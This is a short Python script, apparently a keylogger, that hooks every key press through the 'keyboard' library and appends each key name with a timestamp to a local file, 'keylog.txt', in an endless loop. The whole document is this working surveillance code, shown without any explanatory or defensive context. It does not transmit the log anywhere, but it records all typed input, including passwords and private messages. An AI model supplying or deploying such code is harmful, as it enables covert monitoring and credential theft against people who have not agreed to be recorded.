import keyboard
import datetime

def on_key_press(event):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    key_pressed = event.name
    with open('keylog.txt', 'a') as f:
        f.write(f'{timestamp}: {key_pressed}\n')

keyboard.on_press(on_key_press)

while True:
    pass